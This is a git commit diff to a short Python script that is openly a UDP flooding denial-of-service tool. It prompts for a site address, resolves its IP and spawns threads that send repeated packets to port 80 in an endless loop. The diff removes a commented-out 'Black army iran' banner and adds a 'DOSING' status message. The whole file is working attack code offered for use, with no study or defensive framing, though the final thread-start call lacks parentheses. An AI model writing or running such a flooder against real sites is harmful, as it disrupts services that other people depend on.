46543104b9b162fc648857a6d6a901b1553f3a81
Hackermts3113 <88368028+Hackermts3113@users.noreply.github.com>
2022-03-26 18:29:54 +0430

    Update script.py

--- script.py
+++ script.py
@@ -3,7 +3,6 @@ import socket
 import threading
 Site = input("pleas enter site address.  ... ")
 port = 80
-#mess =  "mts3113  \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY"
 mess = "Hackermts3113"*100
 ip   = socket.gethostbyname(Site)
 def attac():
@@ -11,7 +10,7 @@ def attac():
    while True: 
     sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
     sock.sendto(bytes(mess,"UTF-8"),(ip,port))
-    print("packet send")
+    print("packet send | target :"+Site+" | DOSING ... \n ")
 
 while 1<5000:
     threading.Thread(target=attac).start
